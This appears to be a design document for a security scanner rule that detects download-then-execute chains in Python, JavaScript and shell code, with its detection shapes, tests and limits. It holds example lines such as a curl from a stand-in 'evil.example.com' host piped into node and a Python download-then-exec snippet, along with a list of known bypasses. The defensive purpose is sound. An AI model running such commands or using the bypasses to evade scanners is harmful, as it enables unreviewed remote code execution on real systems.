---
type: Guard
title: "download-execute-chain"
description: "No download-then-execute chain (fetch a remote payload, run it unreviewed)."
timestamp: "2026-10-07T00:00:00Z"
guard_id: "download-execute-chain"
checklist_section: ["8"]
standards: ["OWASP:A08"]
---

# No download-then-execute chain

_Author, 2026-10-07_

---

## The threat

Fetching a remote payload and immediately handing it to an execution sink, never
reviewing it, never pinning its contents, is the classic dropper/stager shape: a
malicious dependency, compromised CI script, or backdoored installer fetches its real
payload at run time so static analysis of the shipped source never sees it.
OWASP:A08 (Software and Data Integrity Failures), CWE-494 (Download of Code Without
Integrity Check).

## Why this guard fits the stack

Adapted from Datadog GuardDog's `threat-process-download-exec` source-code rule.
GuardDog screens third-party packages; this guard applies a deliberately narrowed set
of its highest-confidence signatures to the target application's own source: this is
the noisiest of the GuardDog rules ported in this research cycle, so the
Windows/PowerShell, bare-pip-install, and single-signal sub-patterns from the source
rule were dropped to keep false positives low:

```bash
curl -fsSL https://evil.example.com/payload.js | node   # fires: fetch and execute, no review
```

```python
payload = requests.get(url).text
exec(payload)                                            # fires: download then exec, same file
```

## Detection design

1. `applies()` gates on `python`, `javascript`, or `typescript` in `profile.features`.
2. Scans `.py`/`.pyi`/`.js`/`.ts`/`.jsx`/`.tsx`/`.mjs`/`.cjs`/`.sh`/`.bash`/`.zsh`.
3. Four shapes:
   - `shell-pipe-exec`: `curl`/`wget` in command position (start of the line or after
     `|`/`&`/`;`/`(`) piped directly into `bash`/`sh`/`zsh`/`ksh`/`python`/`node`/`perl`,
     reported only where `curl-pipe-to-shell` is silent. That guard already owns
     `curl|wget ... | bash|sh|zsh|dash|python3|perl|ruby` in `.sh`/`.bash` files (it scans
     them unconditionally), so a line its pattern matches is left to it: re-reporting the
     same line under a second rule id would ignore the owner's reviewed exception and the
     `# security: allow-curl-pipe-shell` pragma (PR #1048 review, which measured this on the
     flagship's accepted `astral.sh/uv` installer line). What stays here is `| node`,
     `| ksh`, `| python2` in any shell script and every interpreter in a `.zsh` script,
     which `curl-pipe-to-shell` does not scan. The command-position anchor keeps
     `grep curl notes | sh` and a `die "... curl ... | sh"` message string silent.
     **Gate consequence:** `curl ... | bash` in a `.sh`/`.bash` script is now reported only by
     `curl-pipe-to-shell`, at its severity (MEDIUM), so it no longer fails the default
     `--fail-on high` gate there. The same line in a `.zsh` script, and `| node`/`| ksh`/
     `| python2` anywhere, is still this guard's HIGH. That asymmetry is the price of not
     double-reporting one line under two rule ids; raising it means changing
     `curl-pipe-to-shell`'s severity, not re-adding the shape here.
   - `download-chmod-execute`: `curl -o FILE`, `curl -O URL` (the file is the URL's
     basename) or `wget -O FILE`, then, on the same or a later line, `chmod +x`, `&& ./`, or
     `sh FILE.sh` in command position on a line that names that file. One finding per line.
     The output flag may end a combined short-flag cluster (`curl -fsSLo FILE`,
     `wget -qO FILE`). The flags are case-sensitive: wget's lowercase `-o FILE` (or `-qo FILE`)
     is its log file, not the download. A download-only line never fires
     (`curl -o /tmp/get.sh https://host/get.sh` used to, twice, because an unanchored
     `sh X.sh` matched the URL tail; PR #1048 review).
     How a line is read: it is split into shell commands at unquoted, unescaped `;`, `&` and
     `|` (a separator inside quotes or escaped, as in `"https://h/p?a=1&b=2"`,
     `-H 'X: a|b'` or `\&`, is not a boundary), and only a curl/wget command's own flags
     count, so `| tar -xzO file` and `&& unzip -qo x.zip` are never read as an output flag.
     A command starts at its command word, which may sit behind an assignment, `!`, `$(`,
     `(`, a backtick or a quote, or carry a path (`r=$(curl`, `!curl`, `` x=`curl ``,
     `alias dl='curl`, `/usr/bin/curl`). EVERY download is registered: each `-o`/`-O` value,
     each `-O URL` pair, and every curl/wget command on the line, not only the first.
     Every download in the file is remembered (no window and no cap), and a chmod/run line is
     matched by looking up its OWN path tokens in that set, so the cost is the line's length
     however many files were downloaded. A path token is the text between whitespace,
     separators and redirects, without surrounding parens, backticks, quotes or a leading
     `./`: `./tool`, `"tool"`, `tool;` and `(tool)` all match a download of `tool`, and a
     command substitution stays whole (`-o "$(mktemp)"` does not match an unrelated
     `chmod +x "$(command -v tool)"`), a whole name never
     matches part of another (`-o out` does not match `./layout.sh` or `./out.sh`), and
     `./tmp/x` is not `/tmp/x`. A download saved under a bare name (no `/`) is also matched
     by the basename of a directory-qualified run path, because the guard does not track `cd`:
     `cd /opt/app/bin && curl ... -o tool` then `chmod +x /opt/app/bin/tool`, or
     `cd "$DIR" && curl ... -o tool` then `chmod +x "$DIR/tool"`, fire. Accepted false-positive
     class (PR #1048, the same as at 49f3b373): a bare `-o x` also matches an unrelated
     `chmod +x bin/x`. An output that puts nothing on disk (`-`, `/dev/null`,
     `/dev/stdout`, `/dev/stderr`) is not a downloaded file. Known limit: a later `tar xzf release.tar.gz && ./configure` after
     `curl -O .../release.tar.gz` fires (the tarball name is on the line), which is the same
     download-without-checksum-then-run shape.
   - `python-download-exec` / `python-download-run`: a `requests.get`/
     `urllib.urlopen`/`urlretrieve` call within 15 lines before a bare `exec`/`eval`,
     or `urlretrieve` within 15 lines before a `subprocess.run`/`call`/`Popen` call.
   - `js-fetch-then-eval`: `fetch(...)` chained into `.then(...eval...)` (within 120
     characters of the fetch call's closing paren), reported at the `fetch` line. A file
     that merely contains a `fetch()` and an unrelated `eval`/`new Function` does not fire:
     that co-occurrence is every swagger-ui/webpack bundle and template engine (PR #1048
     review measured it on vendored bundles). Known false negative of that choice: the
     `await` form (`const code = await (await fetch(u)).text(); eval(code)`).
4. Suppress an audited case (a legitimate, reviewed installer script) with a
   whole-file pragma comment anywhere in the file:
   `# security: allow-download-execute-chain`.
5. All rules emit `severity="high"`, standards `["OWASP:A08", "CWE-494"]`.

## When NOT to flag

A download with no execution anywhere in the file (fetching a config, a JSON
response) never fires. A download and an unrelated `exec`/`eval` more than 15 lines
apart in the same file (e.g. an application that legitimately fetches data early and
separately runs a trusted, hardcoded snippet much later) stays silent; the window is
deliberately tight to avoid flagging unrelated code that merely coexists in a large
file.

## Tests

| Test | What it checks |
|---|---|
| `test_fires_on_curl_pipe_node` | `curl \| node`, `wget -O- \| python2`, `curl \| ksh` fire (and `curl-pipe-to-shell` is silent) |
| `test_fires_on_curl_pipe_bash_in_zsh_script` | `wget -O- \| python3` in a `.zsh` script fires |
| `test_shell_pipe_covered_by_curl_pipe_to_shell_is_left_to_it` | `\| bash`/`\| sh`/`\| python3`/`\| sudo bash` in `.sh`/`.bash` stay silent here while `curl-pipe-to-shell/unverified-pipe` still fires |
| `test_passes_curl_not_in_command_position` | `grep curl notes \| sh` and `curl ... \| sh` inside a `die`/`echo` string stay silent |
| `test_fires_on_download_chmod_execute_same_line` | download+chmod+run fires |
| `test_download_chmod_execute_reports_a_line_once` | a download+chmod+run line is reported once, not twice |
| `test_fires_on_download_then_chmod_execute_on_a_later_line` | a later `chmod +x FILE && FILE` line fires, at that line |
| `test_fires_on_curl_remote_name_download_then_execute` | `curl -O URL` then running the URL's basename fires |
| `test_passes_download_only_line_whose_url_ends_in_sh` | `curl -o /tmp/get.sh https://.../get.sh` alone stays silent |
| `test_passes_curl_remote_name_download_and_unrelated_script` | `curl -O .../get.sh` then `sh ./unrelated.sh` stays silent |
| `test_passes_wget_lowercase_o_log_file` | wget's `-o LOGFILE` is not read as a download |
| `test_fires_on_combined_short_flags_ending_in_the_output_flag` | `curl -fsSLo FILE` and `wget -qO FILE` then run fire |
| `test_passes_wget_combined_lowercase_o_log_file` | wget `-qo LOGFILE` stays silent (mutation-proven) |
| `test_fires_on_every_download_on_a_line_not_only_the_first` | two curls on a line, two `-o` on one curl, two `-O URL` pairs, curl then wget: the later download run on the next line fires |
| `test_passes_another_commands_flag_after_curl_or_wget` | `\| tar -xzO file`, `\| tar -xzo file`, `&& unzip -qo x.zip` are not read as the download's output flag |
| `test_fires_on_downloads_in_glued_or_chained_commands` | `;`-glued, `cd /tmp;curl ...`, and `cd && curl -o x && chmod +x x && ./x` fire |
| `test_fires_when_a_quoted_or_escaped_separator_precedes_the_output_flag` | `&`, `;`, `\|` inside a quoted URL, header, form body, `-w` format, or an escaped `\&`, do not cut the command before `-o FILE` |
| `test_command_split_stays_linear_on_hostile_quotes` | unclosed quotes, backslash runs, mixed quotes and `& ` runs stay linear (slow) |
| `test_fires_on_a_prefixed_curl_command_word` | `r=$(curl`, `OUT=$(curl`, `!curl`, `` x=`curl ``, `alias dl='curl`, `/usr/bin/curl`, `echo $(curl`, `sh -c 'curl` fire |
| `test_fires_on_an_earlier_download_not_only_the_latest` | `curl -o a; curl -o b` then `chmod +x ./a` fires |
| `test_a_second_command_word_in_one_command_switches_the_flag_grammar` | a curl and then a wget in one command: wget's `-O FILE` is read as wget's output |
| `test_fires_on_a_relative_download_run_by_a_directory_qualified_path` | `cd DIR && curl -o tool` (or `-O`) then `chmod +x DIR/tool` / `"$DIR/tool"` fire |
| `test_accepted_fp_a_bare_download_name_matches_any_directory_with_that_basename` | pins the accepted FP: `-o x` then `chmod +x bin/x` fires |
| `test_passes_command_substitution_target_and_an_unrelated_substitution_run` | `-o "$(mktemp)"` then `chmod +x "$(command -v tool)"` stays silent |
| `test_fires_on_command_substitution_and_parenthesised_paths` | `"$(mktemp)"`, `"$(mktemp -d)/x"` and `(chmod +x /tmp/x)` fire |
| `test_fires_on_a_payload_run_after_many_decoy_downloads` | a payload run after 200 decoy downloads still fires |
| `test_download_then_chmod_scan_stays_linear_with_many_targets_and_chmod_lines` | n downloads plus n unrelated chmod lines scans linearly and the latest download still fires (slow) |
| `test_passes_stdout_or_null_target_and_substring_names` | `-O -`, `-o /dev/null`, `-o /dev/stdout`, and a target that is only a substring of the run file (`out` vs `./layout.sh`, `./out.sh`) stay silent |
| `test_fires_when_the_downloaded_path_is_run_as_a_whole_token` | `tool` / `./tool` / `/tmp/p` run on a later line fire |
| `test_fires_on_python_download_then_exec` | `requests.get` + `exec` within window fires |
| `test_fires_on_python_urlretrieve_then_run` | `urlretrieve` + `subprocess.run` within window fires |
| `test_fires_on_js_fetch_then_eval` | `fetch().then(eval)` fires |
| `test_fires_on_multiline_fetch_then_eval_chain_at_the_fetch_line` | a chain broken across lines fires, anchored at the `fetch` line |
| `test_passes_unrelated_fetch_and_eval_in_one_file` | a swagger/webpack-style bundle and a template engine with an unrelated `fetch` and `eval`/`new Function` stay silent |
| `test_passes_ordinary_curl_pipe_to_file` | `curl > file.json` stays silent |
| `test_passes_download_with_no_execute` | download with no exec anywhere stays silent |
| `test_passes_unrelated_download_and_exec_far_apart` | download/exec outside the window stays silent |
| `test_pragma_suppresses_whole_file` | whole-file pragma suppresses |
| `test_does_not_apply_with_no_relevant_stack` | `applies()` is `False` with no relevant feature |
| `test_fires_on_a_run_path_glued_to_shell_syntax` | a run path glued to `;`, `>`, `<`, wrapped in `( )` or backticks, an unquoted run of a quoted `"$TMP/x"` download, and `curl -O A B` then running A, fire |
| `test_passes_a_url_that_curl_does_not_save` | `curl -O A B` then running B (only A is saved), and a curl remote-name flag left pending when a wget starts in the same command, stay silent |
| `test_deferral_suffixes_match_what_curl_pipe_to_shell_scans` | the `.sh`/`.bash` deferral set equals the file set `curl-pipe-to-shell` actually scans (measured from its behaviour) |
| `test_curl_remote_name_scan_stays_linear_on_a_long_line` | a line of repeated `curl -O ` with no URL scans linearly (slow) |
| `test_every_shape_49f3b373_reported_is_still_reported` | the shapes from the PR #1048 review matrices that 49f3b373 reported still report the same rule set |
| `test_known_fps_preserved_since_49f3b373_still_report` | pins the known FPs kept from 49f3b373 (`echo curl -o ...`, `echo "curl -o ..."`, `grep curl -o ...`, `man curl -o ...`) |
| `test_the_documented_drops_since_49f3b373_stay_silent` | the four deliberate drops (`-o -`, `-o /dev/null`, `out` vs `./layout.sh`, `./tmp/x` vs `/tmp/x`) stay silent |

## Known bypasses

Widening the gap between download and execution beyond the 15-line window, routing
the payload through an intermediate variable/function indirection, or using a less
common HTTP client or execution API all evade these specific regexes. This is a
signature match on the most common idioms, not a data-flow analysis.

Known limits of the shell `download-chmod-execute` reading (PR #1048 review):

- **Shapes not read:** `--output=FILE`, `--output FILE`, a value glued to its flag
  (`-o/tmp/x`), `curl URL > /tmp/x`, a `\` continuation line, `curl -OL`, `curl URL -O`,
  an indirect command word (`${CURL:-curl}`, `$(command -v curl)`, `"$CURL"`, `\curl`,
  `curl.exe`), and ANSI-C `$'...'` quoting.
- **Known false positives, kept as at 49f3b373:** curl named as an argument or in a string
  rather than run (`echo curl -o /tmp/x URL`, `grep curl -o /tmp/x notes`, `man curl -o ...`),
  and a bare `-o x` matched by an unrelated `chmod +x bin/x` (the guard does not track `cd`).
- **Deliberate drops since 49f3b373:** `-o -` and `-o /dev/null` (nothing on disk), a
  substring name (`-o out` vs `./layout.sh`), and `./tmp/x` vs `/tmp/x` (different files).
- `curl -O https://example.com` (no path) registers the host name as the downloaded file.

## What this guard does NOT prove

A clean scan does not rule out a download-then-execute chain built from less common
primitives, split across multiple files, or separated by more than the detection
window. Several well-known, legitimate installer scripts (e.g. official language/tool
installers) also use the `curl | sh` shape: a true positive here is not automatically
malicious, and the suppress pragma exists for exactly that case.

# Citations

[1] agentsec checklist item `8-download-execute-chain` (§8)
[2] OWASP:A08
[3] CWE-494
[4] Datadog GuardDog `threat-process-download-exec`: https://github.com/DataDog/guarddog
